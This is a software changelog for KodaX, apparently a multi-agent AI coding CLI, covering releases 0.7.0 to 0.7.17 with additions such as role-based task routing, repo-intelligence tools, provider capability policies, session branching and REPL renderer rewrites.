## [0.7.17] - 2026-04-12
### Added
- **MCP fallback whitelist**: Fallback whitelist, dispose/resetTransport split, documentation for #108-#111
- **Session history seed conversion**: Tool summary display improvements and v0.7.35 feature docs
- **Lightweight i18n framework**: Internationalization framework for UI strings with English and Chinese support (en/zh)
- **End-turn fallback auto-continuation**: Managed protocol end_turn fallback auto-continuation and v0.7.35 Engineering Shell Maturity planning

### Fixed
- Classify 'aborted' errors as retryable `connection_failure`, simplify transient error hint

---

## [0.7.16] - 2026-04-11

### Added
- **FEATURE_061 Phase 2 — Scout direct completion**: Scout now completes H0 tasks end-to-end as both judge and executor, eliminating the scout-then-hand-off round-trip
- **FEATURE_061 Phase 3 — Context continuation across role upgrades**: Scout→Generator (H1) and Scout→Planner (H2) preserve session context, eliminating cold-start context breaks
- **FEATURE_061 Phase 4 — Role-level subagent capability**: Every core role (Scout/Planner/Generator/Evaluator) can spawn subagents for parallel work via `runOrchestration`
- **FEATURE_062 — Managed task budget simplification**: Immutable budget model with 2 fields + 4 functions replaces 10 fields + 14 functions; convergence signal inline in `buildWorkerRunOptions`
- **MCP transport module**: New `transport.ts` for improved MCP provider capability

### Changed
- **FEATURE_061 Phase 1 — Pre-Scout routing layers removed**: No more LLM routing call, harness guardrails, or Scout bypass before Scout entry; Intent Gate goes straight to Scout
- **Reasoning pipeline trimmed**: `createReasoningPlan` uses heuristic-only routing; `routeTaskWithLLM` dead-coded (FEATURE_061 Phase 1)
- **Harness guardrail system simplified**: `applyManagedHarnessGuardrailsToPlan` passes review context without forcing harness floors (FEATURE_061 Phase 1)
- **Task engine simplified**: ~3200 net lines removed from `task-engine.ts` — tactical flows, budget zones, and pre-Scout bypass paths consolidated
- **REPL commands updated**: Command types and interactive commands adapted for simplified AMA flow
- **Status bar and UI surfaces updated**: Status bar, shortcuts, surface status adapted for Scout-first architecture
- **Clipboard utility hardened**: Improved clipboard handling with expanded test coverage
- **Provider resilience expanded**: Error classification and resilience tests updated for broader transient pattern coverage
- **ACP server updated**: ACP server and CLI option helpers updated for Scout-first routing

### Removed
- `shouldBypassScoutForManagedH0` and Scout bypass path — all AMA tasks now go through Scout (FEATURE_061 Phase 1)
- `resolveManagedHarnessGuardrail` and pre-Scout harness floor enforcement (FEATURE_061 Phase 1)
- 3 Tactical Flow variants (`runTacticalReviewFlow`, `runTacticalInvestigationFlow`, `runTacticalLookupFlow`) — replaced by role-level subagent capability (FEATURE_061 Phase 4)
- Budget zone functions (`resolveBudgetZone`, `resolveWorkerIterLimits`, `formatBudgetAdvisory`, reserve logic) — replaced by simple cap/used model (FEATURE_062)
- ~3200 net lines removed across task-engine, reasoning, and related modules

---

## [0.7.15] - 2026-04-10

### Added
- **Fullscreen transcript surface rewrite**: Local renderer replaces Ink substrate for fullscreen REPL — vendored renderer, localized terminal hooks, renderer-native transcript interaction, and explicit transcript mode replacing implicit review mode
- **REPL cockpit substrate**: New prompt input controller with deep keyboard routing, footer surfaces for help/notices/queued state, transcript-native tool explanations, and owned TUI compatibility layer
- **Feature 045 provider-resilience**: Stream resilience across all provider layers with expanded transient error detection, Scout H0 tool policy fix, and prompt waiting/busy terminal state clarification
- **AMA tactical fan-out**: Investigation fan-out slice, lookup triage, and generalized reduction for AMA tactical planning; centralized branch lifecycle in scheduler; child-fanout restricted to runtime-backed review validation
- **Harness calibration and persistence**: Harness calibration corpus and checkpoint profiling, pivot persistence substrate, and workspace runtime truth (Feature 053)
- **Durable memory anchors**: First-class retrieval substrate with durable memory anchors, sectionized prompt assembly with prompt snapshot contracts
- **Multimodal artifact input substrate**: Align multimodal prompt artifact transport for rich content flows
- **Official sandbox extension substrate**: New sandbox extension package foundation
- **Incremental repo intelligence refresh**: Incremental update support for repo intelligence artifacts
- **Feature 055 REPL hardening**: REPL substrate hardening with bracketed paste protocol (replacing timing-based detection), busy prompt shell virtualization, and graceful exit flow serialization
- **Renderer viewport truth alignment**: Transcript scroll now uses renderer-accurate viewport geometry

### Changed
- **Fullscreen REPL localized from Ink**: Renderer internals, core engine shell, root primitives, input parsing, and terminal runtime hooks all localized; Ink substrate fully isolated
- **Transcript surface refactored**: Transcript body/footer separated, search moved into transcript footer, windowing moved into scrollbox, surface lifecycle finalized
- **Prompt shell split from transcript shell**: Separate prompt shell policy with hardened exit flow and interactive exit lifecycle cleanup
- **Repointel skill reorganized**: Follows Claude Code Skills spec; host integration refactored
- **Legacy project shell retired**: Removed from REPL surface
- **Prompt sectionization**: Prompt assembly sectionized with snapshot contracts for reproducibility

### Fixed
- Fullscreen banner moved into transcript history for correct ordering
- MCP typing and transcript chrome behavior stabilized
- Transcript selection rooted in rendered geometry
- Prompt streaming feedback simplified
- Native transcript browser controls, footer separators, and mouse selection restored
- Native clipboard preferred on local terminals
- Transcript viewport budget aligned; spinner liveness restored
- Transcript compact output truncation fixed
- REPL status colors and banner logo restored after regression
- Message list hook order regressions fixed
- Prompt editing shortcuts exposed in help and registry
- Transcript search anchoring and keyboard routing tightened
- Docs-only technical docs kept out of H2 reasoning path
- Pruning gap ratio added to prevent repeated shallow compaction
- Wheel history and banner unsticking on risky hosts

---

## [0.7.14] - 2026-04-02

### Added
- **Repo-intelligence dirty snapshot strategy and inventory tracking**: Dirty snapshot support for memoized reuse across requests, baseline/inventory files for clean git baseline tracking, file analysis index and dirty source hint caching

### Changed
- Bump repo-intelligence schema versions (index: 1→3, query: 2→9)
- Sort dependencies alphabetically in package.json

---

## [0.7.13] - 2026-03-31

### Added
- **FEATURE_045: Provider Stream Resilience and Graceful Recovery**: Comprehensive stream resilience improvements across all provider layers — expanded transient error detection with 21 message patterns, retry delay interruptible via AbortSignal, enhanced streaming robustness for Anthropic/OpenAI/custom providers
- **User-Agent compatibility mode**: New `userAgentMode` config field (`compat`/`sdk`) on custom and built-in providers to control User-Agent header for gateway compatibility
- **Shell environment hydration**: Resolve API keys and PATH from login shell profiles (bash/zsh/fish) when not available in the current process environment; null-delimited parsing with sentinel-based extraction
- **Multi-tool call tracking**: Refactored single `activeToolCall` into array-based `activeToolCalls` for concurrent tool call tracking in the UI layer
- **Tool confirmation module**: Extracted `buildToolConfirmationPrompt` into dedicated `tool-confirmation.ts` with network/delete command detection
- **Managed task live status label**: New `formatManagedTaskLiveStatusLabel` for phase-aware status rendering with worker prefix trimming
- **`onToolInputDelta` metadata**: Stream callback now receives optional `toolId` for multi-tool correlation
- **New types**: `KodaXProviderUserAgentMode`, `ShellEnvRunner` utility type
- **New tests**: Stream resilience (40+ lines), reasoning (75+ lines), task engine (470+ lines), error classification (25+ lines), retry handler (26+ lines), custom providers (104+ lines), InkREPL managed transcript (17+ lines), live streaming (43+ lines), transcript layout (81+ lines), CLI option helpers (47+ lines), ACP server (26+ lines), StatusBar (18+ lines), tool display (6+ lines), extension runtime (123+ lines), provider capability tests (77+ lines)

### Changed
- **Error classification unified**: Duplicated inline transient pattern checks replaced with `TRANSIENT_MESSAGE_PATTERNS` array and `matchesTransientMessage()` helper
- **Retry delay abortable**: `withRetry()` now accepts optional `AbortSignal`; `waitForRetryDelay()` resolves immediately on abort instead of waiting for the full delay
- **Tool preview length**: Truncation limit increased from 100 to 240 characters for better tool input visibility
- **Managed task breadcrumb**: Added `round` phase support with note propagation
- **Transcript layout enhanced**: Expanded with new row types and improved formatting

### Removed
- **pi-docs directory**: Deleted obsolete `docs/pi-docs/` reference documentation (28 files, ~13k lines)

### Documentation
- **FEATURE_LIST.md**: Added FEATURE_045 (Provider Stream Resilience), updated tracked feature count to 45
- **v0.7.15 feature design**: New design doc for FEATURE_045

---

## [0.7.12] - 2026-03-30

### Fixed
- Resolve mojibake (garbled text) in `kodax --help` output, CLI descriptions, and code comments across `kodax_cli.ts` — replaced 16 garbled strings with proper English text
- Fix garbled CJK keyword regex in `reasoning.ts` by referencing existing clean pattern constants instead of inline mojibake
- Replace separator with `→` in StatusBar routing/scout status display
- Propagate CLI model selection through ACP bridge

### Changed
- Add `.npmrc` to pin `registry.npmmirror.com` for consistent lockfile across machines

---

## [0.7.11] - 2026-03-30

### Added
- **Skill-aware AMA role projection**: skill invocations now carry `skillInvocation` metadata into managed execution, `Scout` emits a `skill-map`, and AMA roles consume role-specific skill views instead of sharing the same raw skill prompt
- **Skill artifacts for managed tasks**: managed workspaces now persist `skill-execution.md`, `skill-map.json`, and `skill-map.md`
- **Same-role round summaries for non-generator roles**: `Scout`, `Planner`, and `Evaluator` now persist a compact previous-round summary that is re-injected on later rounds without restoring full private chat history
- **Global work-budget approval loop**: AMA runs use a unified `globalWorkBudget` with repeated `+200` approval extensions near the 90% threshold
- **Improved tool disclosure**: REPL tool summaries now prefer target path/scope/cmd details, including explicit `bash` command display
- **Interrupted-response persistence test coverage**: new UI regression coverage for Ctrl+C persistence queuing
- **FEATURE_044**: Durable Compression Anchors and Artifact Recall spec added to v0.8.0 feature docs

### Changed
- **AMA simplified**: `H3_MULTI_WORKER`, default `Admission`, `Lead`, and `Contract Reviewer` were removed from the main runtime graph; AMA now operates with `H0_DIRECT`, `H1_EXECUTE_EVAL`, and `H2_PLAN_EXECUTE_EVAL`
- **Routing ceilings tightened**: `read-only` and `docs-only` work now stay on `SA/H0` by default, may use `H1` only when the user explicitly asks for stronger checking, and can no longer enter `H2_PLAN_EXECUTE_EVAL`
- **Repo scale semantics narrowed**: `reviewScale`, repo size, and changed-scope signals now shape evidence strategy only instead of forcing a heavier harness
- **H2 default pass count reduced**: coordinated mutation work now starts with a single main pass and opens extra passes only after structured evaluator failure
- **SA semantics clarified**: `SA` now bypasses AMA entirely and runs through the direct single-agent path
- **Project + SA continuity clarified**: project-aware direct runs now persist a lightweight run record for status, latest summary, and next-step guidance without entering the managed-task graph
- **Intent-first routing**: lightweight `conversation` / `lookup` inputs short-circuit before dirty-repo complexity can escalate them
- **Scout and Planner evidence boundaries tightened**: Scout stays pre-harness, Planner is restricted to scope facts plus overview evidence, and Generator owns deep evidence passes
- **Pre-Scout routing notes neutralized**: live AMA routing notes now stay provisional until Scout confirms the final harness
- **Status bar semantics updated**: `Work used/total` is the primary AMA budget signal; `Round` appears only when a real extra pass exists; AMA no longer falls back to user-visible `Iter x/y`
- **Evaluator public-answer contract tightened**: review answers are written directly for the user instead of narrating evaluator-vs-generator meta-review
- **Command metadata parity improved**: builtin commands now align more closely with discovered command metadata fields
- **Core docs refreshed**: HLD, DD, ADR, PRD, feature designs, and roadmap notes now match the current SA/AMA/skill architecture

### Fixed
- Interrupted managed tasks now filter empty/control-plane placeholder evidence from transcript rendering and queue the last visible response for background persistence
- Mixed lookup/actionable prompts no longer short-circuit onto the pure lookup path
- H1 revise no longer auto-escalates on the first evaluator retry
- H1 read-only Generator now receives both runtime write guards and explicit prompt guidance to stay non-mutating
- Scout downshifts now complete as Scout-owned `H0_DIRECT` runs instead of handing off to a second direct agent or leaking scout-flavored output

### Tests
- Added / expanded tests for `task-engine`, `reasoning`, `tool-display`, `live-streaming`, `StatusBar`, `invocation-runtime`, `types-legacy`, and `InkREPL.interrupted`

<!-- last-sync: dfce6cd5 -->

### Added
- **Repository intelligence substrate (FEATURE_018)**: Task-aware repository intelligence layer under `.agent/repo-intelligence/` with durable artifacts — `repo-overview.json`, `changed-scope.json`, `module-index.json`, `symbol-index.json`, `process-index.json`, `repo-intelligence-manifest.json` — supporting incremental refresh, freshness metadata, and language-tiered extraction (TS/JS via AST, Python, Go, Rust, Java, C++)
- **Intelligence query surfaces**: Six first-class retrieval tools — `repo_overview`, `module_context`, `symbol_context`, `process_context`, `impact_estimate`, `changed_scope` — returning structured capsules with freshness, confidence, evidence, and progressive disclosure (FEATURE_028)
- **Repo-intelligence tools**: `repo-overview.ts`, `module-context.ts`, `symbol-context.ts`, `process-context.ts`, `impact-estimate.ts`, `changed-scope.ts`, `internal.ts`, and `query.ts` in `packages/coding/src/tools/` and `packages/coding/src/repo-intelligence/`
- **Adaptive multi-agent mode toggle (FEATURE_027)**: Persistent `agentMode` setting (`sa`/`ama`) with CLI (`--agent-mode`), REPL (`/agent-mode`), and keyboard shortcut (`Alt+M`) entry points; status bar shows `KodaX - SA` or `KodaX - AMA`
- **SA mode execution constraint**: Single-Agent mode clamps execution to single-agent path while preserving task routing, metadata, and managed-task artifacts — reducing token cost
- **`--team` deprecation**: `--team` removed from main product surface, retained as deprecated compatibility path that warns and refuses execution
- **Agent mode shortcut**: `Alt+M` default shortcut for runtime SA/AMA toggle with command fallback
- **Prompt-time intelligence injection**: Automatic active-module and active-impact injection for edit/review/refactor flows via `buildPromptOverlay()`
- **Routing enrichment**: `stabilizeRoutingDecision()` now consumes lightweight repo-intelligence signals to raise complexity, bias planning, and choose safer harness profiles
- **Task evidence snapshots**: Managed tasks persist task-scoped retrieval snapshots (repo overview, changed scope, active module, impact) into evidence bundles
- **New types**: Intelligence capsule types, confidence tiers, freshness metadata, language capability tiers in `@kodax/coding` and `@kodax/ai`
- **New tests**: Repo-intelligence tool tests, reasoning tests for intelligence-aware routing, agent mode tests, status bar mode display tests, shortcut tests

### Changed
- **CLI entry points**: `kodax_cli.ts` updated for `--agent-mode` flag and deprecated `--team` handling
- **Reasoning pipeline expanded**: `reasoning.ts` (+495 lines) enriched with repo-intelligence signals, language-tiered extraction, and low-confidence fallback guidance
- **Task engine expanded**: `task-engine.ts` (+2645 lines) with intelligence query integration, evidence snapshot persistence, and managed-task lifecycle enrichment
- **Orchestration updated**: `orchestration.ts` refactored for intelligence-aware task dispatch and SA mode constraint propagation
- **REPL UI updated**: `InkREPL.tsx` gains agent mode display, mode toggle handling, and mode-aware rendering; `StatusBar` shows current agent mode
- **Session storage**: `storage.ts` gains `agentMode` persistence in session metadata
- **Provider registry**: Provider capability checks updated for intelligence-query-aware policy evaluation
- **Documentation**: v0.7.0, v0.8.0, v0.9.0 feature docs, FEATURE_LIST, KNOWN_ISSUES, and feature README updated for 018/027/028

---

## [0.7.5] - 2026-03-26

### Added
- **Task engine (FEATURE_022)**: `runManagedTask()` in `packages/coding/src/task-engine.ts` — full managed task lifecycle with contract creation, role assignment, evidence collection, and orchestration verdict; integrates with `runOrchestration` for multi-worker task execution
- **Task contract types**: `KodaXTaskContract`, `KodaXTaskRoleAssignment`, `KodaXTaskWorkItem`, `KodaXTaskEvidenceArtifact`, `KodaXTaskEvidenceEntry`, `KodaXTaskEvidenceBundle`, `KodaXOrchestrationVerdict`, `KodaXManagedTask` in `@kodax/coding`
- **Task context types**: `KodaXTaskCapabilityHint`, `KodaXTaskVerificationContract`, `KodaXTaskToolPolicy` for structured verification and tool policy contracts
- **Task surface tracking**: `KodaXTaskSurface` type (`cli`/`repl`/`project`/`plan`) propagated through execution context to identify managed task entry points
- **Session scope**: `KodaXSessionScope` (`user`/`managed-task-worker`) on `KodaXSessionData` and `KodaXSessionMeta` for worker session identification; `scope` option on `KodaXSessionOptions`
- **Project control state**: `ProjectControlState` interface and `createProjectControlState()` factory for tracking workflow mutations separately from derived workflow state
- **Managed task persistence**: `ProjectStorage` read/write for managed task artifacts (`managed-task.json`) and control state (`control-state.json`)
- **JSON guards**: Type guards for `ProjectControlState`, `KodaXManagedTask`, `KodaXTaskVerificationContract`, `KodaXTaskToolPolicy`, `KodaXTaskCapabilityHint` in `json-guards.ts`
- **Orchestration abort propagation**: `AbortSignal` threading from `runOrchestration` options through task runners to agent execution; `mergeAbortSignals()` utility for composite abort handling with `AbortSignal.any` fallback
- **Orchestration task cancellation**: `buildCancelledTaskResult()` and early-exit loop when external abort signal fires, marking all pending tasks as blocked
- **Task runner hooks**: `createOptions` and `onResult` callbacks on `CreateKodaXTaskRunnerOptions` for per-task option customization and post-result side effects
- **New tests**: Task engine integration tests, orchestration abort tests, project storage managed task tests, project harness control state tests, storage scope tests, CLI option helper tests

### Changed
- **CLI entry points use `runManagedTask`**: `kodax_cli.ts` replaced `runKodaX` with `runManagedTask` for all execution paths (direct, command, print) with `taskSurface: 'cli'`
- **Project commands use `runManagedTask`**: `/project next` and `/project auto` now execute via `runManagedTask` with project surface, feature metadata, and verification contracts
- **Workflow state derivation refactored**: `ProjectStorage.inferWorkflowState` replaced with `deriveWorkflowState` that considers control state, alignment truth, and managed task status for more accurate stage inference
- **Project harness verification integration**: Verification results now map to managed task verdict (`completed`/`blocked`) and update evidence entries with signals
- **Control state propagated**: Discovery, planning, and execution commands now use `saveProjectControlState` instead of directly mutating workflow state

### Documentation
- **ADR, DD, HLD, PRD**: Updated architecture decision records, design document, high-level design, and product requirements for FEATURE_022 task engine
- **Feature design docs**: v0.7.0, v0.8.0, v0.9.0, v1.0.0 feature documents updated for task engine integration and dependency tracking
- **FEATURE_LIST.md**: Updated with FEATURE_022 progress and cross-feature dependency references

---

## [0.7.4] - 2026-03-26

### Added
- **Task complexity inference (FEATURE_025)**: Weighted keyword scoring across 4 tiers — `simple`, `moderate`, `complex`, `systemic` — with language-aware Chinese and English keyword sets; cross-referenced with task type, risk level, and work intent for calibrated results
- **Work intent detection**: `inferWorkIntent()` classifies requests as `append`, `overwrite`, or `new` based on explicit keyword signals; destructive interpretation preferred when append and rewrite language conflict
- **Brainstorm trigger**: `inferRequiresBrainstorm()` detects ambiguity that warrants option framing — triggered by brainstorm keywords, low-confidence unknown tasks, systemic complexity, or high-risk overwrites
- **Harness profile selection**: `selectHarnessProfile()` maps routing decisions to 4 execution profiles (`H0_DIRECT`, `H1_EXECUTE_EVAL`, `H2_PLAN_EXECUTE_EVAL`, `H3_MULTI_WORKER`) based on task characteristics; automatically downgrades to H1/H2 on lossy bridge providers with recorded routing notes
- **Harness profile prompt overlays**: Dedicated system prompt fragments for each harness profile that guide the LLM's execution strategy
- **Tied task resolution**: `resolveTiedTask()` breaks score ties by checking for explicit directive keywords (review, fix, plan) in the prompt, falling back to `unknown` when no clear winner exists
- **Provider policy hints for decisions**: `buildProviderPolicyHintsForDecision()` converts a routing decision into policy hints — `harnessProfile`, `evidenceHeavy`, `brainstorm`, `workIntent` — threaded through execution context for downstream policy evaluation
- **Harness-aware provider policy rules**: New block/warn rules for `H3_MULTI_WORKER` (blocked on lossy/stateless providers, warned on limited) and `H2_PLAN_EXECUTE_EVAL` (warned on bridge/lossy providers)
- **Routing decision on KodaXResult**: `routingDecision` field on `KodaXResult` exposes the final visible routing decision including harness profile and work intent to callers
- **Extended KodaXProviderPolicyHints**: New `harnessProfile`, `brainstorm`, and `workIntent` fields for context-aware policy evaluation
- **New types**: `KodaXTaskComplexity`, `KodaXTaskWorkIntent`, `KodaXHarnessProfile` in `@kodax/ai`; re-exported through `@kodax/agent` and `@kodax/coding`
- **Extended routing decision**: `KodaXTaskRoutingDecision` gains `complexity`, `workIntent`, `requiresBrainstorm`, `harnessProfile`, and optional `routingNotes` fields
- **New tests**: 10 new reasoning tests (append/overwrite intent, brainstorm triggers, complexity tiers, H3 harness selection, provider downgrade, policy hints, tied task resolution), 2 new provider-policy tests (H3 block, H2 warn), expanded agent policy integration tests

### Changed
- **`stabilizeRoutingDecision` enriched**: Now runs full inference pipeline — work intent, complexity, brainstorm, harness profile — on every routing decision (fallback and LLM-routed) instead of only handling edge cases
- **Prompt overlay expanded**: `buildPromptOverlay()` now includes harness profile, work intent guidance, brainstorm trigger, and routing notes alongside the existing execution mode and task routing fields
- **Auto-reroute preserves enriched decision**: `maybeCreateAutoReroutePlan()` threads provider policy through `stabilizeRoutingDecision` so enriched fields are recalculated on reroute
- **Policy evaluation context passed to streaming**: `evaluateProviderPolicy` call in agent loop now receives `effectiveOptions` and `context` separately for accurate hint resolution
- **Agent loop threads routing decision to result**: All exit paths in `runKodaX` (success, error, cancel, yield, limit) now include `routingDecision` on the result
- **Provider policy hints threaded through execution context**: `buildReasoningExecutionState` injects `buildProviderPolicyHintsForDecision` into context's `providerPolicyHints` so downstream calls see the routing-derived hints
- **Router system prompt expanded**: LLM task router now accepts and validates `complexity`, `workIntent`, `harnessProfile`, `requiresBrainstorm`, and `routingNotes` fields

---

## [0.7.3] - 2026-03-26

### Changed
- **Message fingerprint caching**: `messagesEqual()` now uses a `WeakMap`-based fingerprint cache to avoid repeated `JSON.stringify` during lineage reconciliation, reducing deduplication cost for repeated calls
- **Fork session ID generation**: `MemorySessionStorage.fork()` uses `generateSessionId()` from `@kodax/coding` instead of a timestamp-based fallback for consistent session ID format
- **Guard reporter extraction**: Duplicated session transition guard callback in `InkREPL.tsx` extracted into shared `logSessionTransitionGuard()` helper

### Added
- **API documentation**: JSDoc comments added to all exported session lineage functions (`createSessionLineage`, `getSessionLineagePath`, `getSessionMessagesFromLineage`, `resolveSessionLineageTarget`, `setSessionLineageActiveEntry`, `appendSessionLineageLabel`, `forkSessionLineage`, `buildSessionTree`, `countActiveLineageMessages`)
- **New session lineage tests**: Empty lineage edge case, fork from active leaf without selector, skip branch summaries when `summarizeCurrentBranch` is disabled, missing selector null returns, orphaned entries rendered as separate roots

---

## [0.7.2] - 2026-03-26

### Added
- **Session lineage tree (FEATURE_019)**: `packages/agent/src/session-lineage.ts` — branchable session history with parent-child entry relationships, automatic deduplication, and immutable data structures; supports four entry types: `message`, `compaction`, `branch_summary`, and `label`
- **Session tree visualization**: `formatSessionTree()` renders the lineage as a tree with branch indicators, active-path markers, entry IDs, and optional checkpoint labels
- **Branch-and-continue navigation**: `setSessionLineageActiveEntry()` navigates to any tree node by entry ID or label; automatically summarizes abandoned branches into `branch_summary` entries for context preservation
- **Checkpoint labels**: `appendSessionLineageLabel()` attaches lightweight bookmark labels to any tree node; resolved via `getResolvedLabels()` with last-wins semantics and support for clearing labels
- **Session forking**: `forkSessionLineage()` deep-clones a branch path into an independent lineage with new entry IDs and preserved labels, enabling parallel exploration without mutating the source session
- **`/tree` REPL command**: Inspect, navigate, and label session branches — `/tree` displays the tree, `/tree <selector>` jumps to a node, `/tree label` and `/tree unlabel` manage checkpoint labels
- **`/fork` REPL command**: Export a branch into a new independent session file, optionally from a specific tree node
- **Session transition guardrails**: `evaluateSessionTransitionPolicy()` checks provider capability (session support) before session load, branch switch, or fork operations; blocks operations on stateless providers, warns on limited support
- **Extended `KodaXSessionStorage` interface**: New optional methods `getLineage`, `setActiveEntry`, `setLabel`, and `fork` for storage backends to support lineage operations
- **Session data model additions**: `KodaXSessionLineage`, `KodaXSessionEntry` (4 variants), `KodaXSessionNavigationOptions`, `KodaXSessionTreeNode` types; `KodaXSessionData` gains optional `lineage` field; `KodaXSessionMeta` gains lineage metadata fields
- **Lineage-aware JSONL persistence**: `storage.ts` reads and writes `lineage_entry` records alongside `meta` and `extension_record` lines; backward-compatible migration from legacy flat message arrays via `createSessionLineage()`
- **Lineage-aware session storage utilities**: `session-storage.ts` (Ink) and `MemorySessionStorage` (readline) both support lineage operations with `structuredClone` for immutability
- **Lineage-aware session listing**: `list()` reports active branch message count via `countActiveLineageMessages()` when lineage is present
- **Lineage storage helpers in project-harness**: `readLineageCheckpoints`, `readLineageSessionNodes`, `appendLineageCheckpoint`, `appendLineageSessionNode` with backward-compatible aliases
- **Project harness record schema additions**: `ProjectHarnessCheckpointRecord` and `ProjectHarnessSessionNodeRecord` gain `id` and `taskId` fields for lineage tracking
- **New tests**: `session-lineage.test.ts`, `session-tree-command.test.ts`, `session-guardrails.test.ts`, expanded `storage.test.ts`

### Changed
- **`loadSession` callback returns typed status**: `Promise<boolean>` replaced with `Promise<SessionLoadStatus>` (`loaded`/`missing`/`blocked`) to distinguish missing sessions from provider-guarded blocks
- **`deleteAll` scoped by git root**: `deleteAll()` now accepts optional `gitRoot` parameter for project-scoped session cleanup
- **Session save preserves extension state**: Both storage backends merge existing `extensionState` and `extensionRecords` on save for incremental updates
- **Session load returns cloned data**: `load()` now returns `structuredClone` to prevent accidental mutation of cached session state
- **Project harness persistence method rename**: Internal storage methods migrated to lineage-aware naming; old names kept as backward-compatible aliases

---

## [0.7.1] - 2026-03-26

### Added
- **Provider capability dimensions (FEATURE_029)**: Six new typed capability dimensions — `contextFidelity`, `toolCallingFidelity`, `sessionSupport`, `longRunningSupport`, `multimodalSupport`, `evidenceSupport` — added to `KodaXProviderCapabilityProfile` in `@kodax/ai`
- **Normalized capability profile**: `NormalizedKodaXProviderCapabilityProfile` type and `normalizeCapabilityProfile()` function ensuring all capability fields have explicit values with sensible defaults
- **Provider policy engine**: `packages/coding/src/provider-policy.ts` — `evaluateProviderPolicy()` evaluates provider constraints against task context (multimodal, MCP, long-running, project-harness, evidence-heavy, reasoning-control scenarios) and returns `block`/`warn`/`allow` decisions with routing notes
- **Policy-aware routing**: Provider policy wired into `createReasoningPlan()` and `buildPromptOverlay()` — routing prompts now include provider constraint notes; `buildRepositoryRoutingSummary` includes provider semantics for LLM routing decisions
- **Agent loop policy enforcement**: `evaluateProviderPolicy()` called in `runKodaX()` before streaming; `block` decisions throw errors, `warn` decisions append notes to system prompt
- **`/provider` REPL command**: Inspect provider capability matrix and common policy scenarios with color-coded block/warn/allow indicators; supports `/provider <name>[/<model>]` syntax
- **Provider capability snapshot helpers**: `getProviderCapabilitySnapshot`, `formatProviderCapabilityDetailLines`, `formatProviderSourceKind`, `getProviderCommonPolicyScenarios`, `getProviderPolicyDecision` in `@kodax/repl`
- **Provider policy types**: `KodaXProviderPolicyDecision`, `KodaXProviderPolicyIssue`, `KodaXProviderPolicyHint`, `KodaXProviderSourceKind` types in `@kodax/coding`
- **New tests**: `provider-policy.test.ts`, `agent.provider-policy.test.ts`, expanded `provider-capabilities.test.ts`; updated existing provider tests for 6 new capability fields

### Changed
- **Capability profiles expanded**: Native providers declare `full` across all 6 new dimensions; CLI bridge providers declare `lossy`/`limited`/`stateless` as appropriate
- **`cloneCapabilityProfile` normalized**: Now returns profile with all capability fields populated via `normalizeCapabilityProfile`
- **Existing provider tests updated**: `acp-base`, `capability-profile`, `cli-bridge-providers`, `custom-providers` tests updated for 6 new profile fields

### Documentation
- **FEATURE_034 design doc**: Capability profile section updated with 6 new dimensions
- **FEATURE_LIST.md**: Updated to reflect FEATURE_029 completion

---

## [0.7.0] - 2026-03-25

### Added
- **Extension Runtime (FEATURE_034)**: Headless programmable runtime with four layers — Extension Runtime (loading, lifecycle, hot reload, provenance), Capability Runtime (discovery, execution, structured result transport), Runtime Control Surface (session state, queued follow-ups, active tools, model/thinking overrides), and Host Adapters (CLI `--extension`, config-based loading, REPL commands)
- **Extension API**: `registerTool`, `registerCapabilityProvider`, `registerModelProvider`, `registerCommand`, `registerSkillPath`, typed `on(event)`, explicit `hook(...)` for `session:hydrate`, `provider:before`, `tool:before`, `turn:settle`
- **Definition-first tool registry**: Tools registered through atomic `LocalToolDefinition` with schema-derived required params; same-name tool override with provenance tracking; removed `KODAX_TOOL_REQUIRED_PARAMS` parallel truth source
- **Runtime model provider registry**: Dynamic model provider registration in `@kodax/ai` with same-name override and `registerModelProvider` API
- **Extension persistence store**: JSONL-backed key-value store in `@kodax/agent` for extension session state, scoped per extension identity with versioned entries
- **Extension commands in REPL**: `/extensions` command to list loaded extensions and `/reload` command to hot-reload extensions
- **`--extension` CLI flag**: Load extensions from CLI invocation
- **Extension command registration**: Extensions can register custom REPL commands via `registerCommand`
- **JSON mode type guards**: `JsonEventsLogger` and `JsonEventEmitter` type guards for structured event streaming
- **Extension types in `@kodax/agent`**: `KodaXExtensionSessionRecord`, `KodaXExtensionSessionState`, `KodaXExtensionStore`, `KodaXJsonValue` types
- **New tests**: extension runtime, agent extension integration, persistence store, tool registry, REPL extension commands, storage, autocomplete extension paths, CLI option helpers

### Changed
- **Agent loop extension integration**: Extension runtime wired into `agent.ts` at `session:hydrate`, `provider:before`, `tool:before`, and `turn:settle` hook points
- **Tool registry rewritten**: Multi-registration per tool name with active-selection semantics, `getRegisteredToolDefinition`, `getBuiltinRegisteredToolDefinition`, `listToolDefinitions` exported API
- **REPL commands refactored**: Chinese comments converted to English; extension-aware command dispatch; `getActiveExtensionRuntime` and `emitActiveExtensionEvent` wired into REPL commands
- **Storage module enhanced**: Extension session state and records persistence integrated into session storage
- **`@kodax/coding` public API expanded**: Extension runtime exports, capability types, tool definition types, extension store API
- **`@kodax/agent` public API expanded**: Extension store factory, extension types
- **`@kodax/ai` public API expanded**: Runtime model provider registration and resolver integration
- **`@kodax/skills` public API expanded**: `registerPluginSkillPath` for extension skill path registration
- **v0.7.0 feature design updated**: FEATURE_034 marked as Completed; roadmap dependency documentation finalized

### Documentation
- **Design document restructure**: Major cleanup of v0.7.0 feature design doc, removing redundant historical drafts while preserving key implementation decisions
- **Feature boundary documentation**: Updated boundary sections for 034 across dependent features (019, 022, 029, 035, 038)
